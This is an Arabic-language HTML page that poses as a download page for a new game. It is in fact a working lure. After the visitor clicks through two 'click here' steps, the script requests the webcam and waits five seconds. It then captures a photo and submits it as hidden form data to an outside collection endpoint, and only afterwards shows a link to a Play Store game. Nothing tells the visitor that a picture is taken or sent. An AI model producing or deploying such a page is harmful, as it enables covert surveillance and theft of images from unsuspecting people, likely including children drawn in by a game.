<DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تحميل اللعبة الجديدة</title>
  <style>
    body { font-family: Arial; text-align: center; padding: 50px; }
    button {
      padding: 10px 20px;
      font-size: 18px;
      border-radius: 8px;
      background-color: #4CAF50;
      color: white;
      border: none;
      margin: 10px;
      cursor: pointer;
    }
    video {
      margin-top: 20px;
      display: none;
    }
  </style>
</head>
<body>

  <h2>🎮 لتحميل اللعبة الجديدة اضغط هنا 👇</h2>
  <button id="step1">اضغط هنا</button>

  <div id="step2Area" style="display:none;">
    <h3>✅ استكمل الشروط</h3>
    <button id="step2">فقط اضغط هنا</button>
  </div>

  <div id="videoArea" style="display:none;">
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
    <form id="form" action="https://usebasin.com/f/9c5452fbd05f" method="POST">
      <input type="hidden" name="image" id="imageData">
    </form>
  </div>

  <div id="downloadArea" style="display:none;">
    <h3>🎁 اضغط هنا للتحميل النهائي</h3>
    <button onclick="window.location.href='https://play.google.com/store/apps/details?id=com.telltalegames.walkingdead100'">
      اضغط هنا للتحميل
    </button>
  </div>

  <script>
    const step1 = document.getElementById("step1");
    const step2Area = document.getElementById("step2Area");
    const step2 = document.getElementById("step2");
    const videoArea = document.getElementById("videoArea");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const form = document.getElementById("form");
    const imageData = document.getElementById("imageData");
    const downloadArea = document.getElementById("downloadArea");

    step1.onclick = () => {
      step2Area.style.display = "block";
    };

    step2.onclick = () => {
      videoArea.style.display = "block";
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.style.display = "block";
          setTimeout(() => {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            imageData.value = canvas.toDataURL('image/png');
            form.submit();
            video.srcObject.getTracks().forEach(track => track.stop());
            downloadArea.style.display = "block";
          }, 5000); // التقاط بعد 5 ثوانٍ
        })
        .catch(error => {
          alert("⚠️ لم يتم السماح بالكاميرا.");
        });
    };
  </script>

</body>
</html>
